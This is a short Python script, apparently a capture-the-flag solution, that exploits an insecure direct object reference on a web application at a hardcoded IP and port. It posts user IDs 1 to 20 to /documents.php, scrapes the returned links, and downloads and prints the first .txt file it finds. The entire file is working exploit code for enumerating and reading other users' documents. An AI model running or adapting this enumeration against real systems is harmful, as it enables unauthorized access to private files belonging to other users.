import requests
from bs4 import BeautifulSoup
import sys

url = "http://159.65.63.151:32057"

session = requests.Session()

for i in range(1, 21):
	data = dict(uid=str(i))
	r = session.post(url + "/documents.php", data=data)

	soup = BeautifulSoup(r.text, "html.parser")
	for link in soup.find_all('a'):
	    # display href tags
	    l = link.get('href')
	    print(l) 
	    if "txt" in l:
	    	r = session.get(url + l)
	    	print("*"*30)
	    	print(f"[+] {r.text}")
	    	sys.exit()